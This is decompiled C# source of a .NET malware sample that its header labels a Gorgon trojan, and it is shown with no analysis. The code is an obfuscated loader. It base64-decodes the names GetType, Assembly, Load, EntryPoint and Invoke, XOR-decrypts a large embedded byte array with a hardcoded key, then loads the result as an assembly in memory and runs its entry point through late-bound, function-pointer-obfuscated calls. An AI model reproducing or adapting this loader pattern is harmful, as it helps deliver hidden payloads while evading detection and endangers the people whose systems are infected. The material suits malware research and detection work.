// Decompiled with JetBrains decompiler
// Type: 6xHrFwRAI8cwf.SnPn8OrTgE8DH
// Assembly: 6xHrFwRAI8cwf, Version=5.6.0.5, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: D0CFE593-D471-48A8-93C1-A7D99C557285
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-52701ab860194c1e24d9b820a6595d741329f7effc2bc27a8cf5e8263a36f055.exe

using \u0036xHrFwRAI8cwf;
using \u0036xHrFwRAI8cwf.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;

namespace \u0036xHrFwRAI8cwf
{
  [StandardModule]
  internal sealed class SnPn8OrTgE8DH
  {
    internal static \u0037NQo3J43CLWMm cuuB1dCFRVENg;
    internal static readonly long JAFrYhRVifVIh;

    private static byte[] RXIp38HC7XdWi(byte[] t36AlyRWq18Jz, string IfsUZW4w7ehpw)
    {
      byte[] numArray = new byte[checked (t36AlyRWq18Jz.Length - 1 + 1)];
      int num = checked (t36AlyRWq18Jz.Length - 1);
      int index = 0;
      while (index <= num)
      {
        int int32 = Convert.ToInt32(IfsUZW4w7ehpw[index % IfsUZW4w7ehpw.Length]);
        numArray[index] = (byte) ((int) t36AlyRWq18Jz[index] ^ (int) checked ((byte) int32));
        checked { ++index; }
      }
      return numArray;
    }

    [CompilerGenerated]
    [STAThread]
    public static void \u003CMain\u003E()
    {
      MyProject.\u0031mXZfslJyShuS.AMUrpMWZBiT1c();
      XoidZN6mKn6m7 xoidZn6mKn6m7_1 = (XoidZN6mKn6m7) new SnPn8OrTgE8DH();
      try
      {
        xoidZn6mKn6m7_1.VHpbTly4kTRTV();
      }
      catch (Exception ex)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (Exception)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[0])(ex);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[1])();
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[2])();
      }
      Dictionary<int, object> dictionary1 = new Dictionary<int, object>();
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      string[] strArray = (__calli((__FnPtr<Encoding ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[3])()).GetString(__calli((__FnPtr<byte[] (string)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[4])("R2V0VHlwZSxBc3NlbWJseSxMb2FkLEVudHJ5UG9pbnQsSW52b2tl")).Split(',');
      int index = 0;
      try
      {
        Dictionary<int, object> dictionary2 = dictionary1;
        XoidZN6mKn6m7 xoidZn6mKn6m7_2 = xoidZn6mKn6m7_1;
        string str = strArray[index];
        object[] objArray = new object[0];
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj1 = __calli((__FnPtr<object (object, string, CallType, object[])>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[5])((object[]) xoidZn6mKn6m7_2, (CallType) str, (string) 2, (object) objArray);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj2 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj1);
        dictionary2.Add(103, obj2);
        checked { ++index; }
      }
      catch (Exception ex)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (Exception)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[0])(ex);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[2])();
      }
      try
      {
        Dictionary<int, object> dictionary3 = dictionary1;
        object obj3 = dictionary1[103];
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj4 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj3);
        string str = strArray[index];
        object[] objArray = new object[0];
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj5 = __calli((__FnPtr<object (object, string, CallType, object[])>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[5])((object[]) obj4, (CallType) str, (string) 2, (object) objArray);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj6 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj5);
        dictionary3.Add(490, obj6);
        checked { ++index; }
      }
      catch (Exception ex)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (Exception)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[0])(ex);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[2])();
      }
      try
      {
        Dictionary<int, object> dictionary4 = dictionary1;
        object obj7 = dictionary1[490];
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj8 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj7);
        string str = strArray[index];
        object[] objArray = new object[1];
        byte[] t36AlyRWq18Jz = new byte[628224];
        // ISSUE: field reference
        RuntimeFieldHandle runtimeFieldHandle = __fieldref (SnPn8OrTgE8DH.cuuB1dCFRVENg);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (Array, RuntimeFieldHandle)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[7])((RuntimeFieldHandle) t36AlyRWq18Jz, (Array) runtimeFieldHandle);
        objArray[0] = (object) SnPn8OrTgE8DH.RXIp38HC7XdWi(t36AlyRWq18Jz, "8494qw9dqwd");
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj9 = __calli((__FnPtr<object (object, string, CallType, object[])>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[5])((object[]) obj8, (CallType) str, (string) 2, (object) objArray);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj10 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj9);
        dictionary4.Add(193, obj10);
        checked { ++index; }
      }
      catch (Exception ex)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (Exception)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[0])(ex);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[2])();
      }
      try
      {
        Dictionary<int, object> dictionary5 = dictionary1;
        object obj11 = dictionary1[193];
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj12 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj11);
        string str = strArray[index];
        object[] objArray = new object[0];
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj13 = __calli((__FnPtr<object (object, string, CallType, object[])>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[5])((object[]) obj12, (CallType) str, (string) 2, (object) objArray);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj14 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj13);
        dictionary5.Add(49103, obj14);
        checked { ++index; }
      }
      catch (Exception ex)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (Exception)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[0])(ex);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[2])();
      }
      try
      {
        Dictionary<int, object> dictionary6 = dictionary1;
        object obj15 = dictionary1[49103];
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj16 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj15);
        string str = strArray[index];
        object[] objArray = new object[2]
        {
          (object) xoidZn6mKn6m7_1,
          null
        };
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj17 = __calli((__FnPtr<object (object, string, CallType, object[])>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[5])((object[]) obj16, (CallType) str, (string) 1, (object) objArray);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        object obj18 = __calli((__FnPtr<object (object)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[6])(obj17);
        dictionary6.Add(1001, obj18);
      }
      catch (Exception ex)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void (Exception)>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[0])(ex);
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) MyProject.MgWnkeV9eHspL<>.AP4k2EEIkflMK[2])();
      }
    }
  }
}
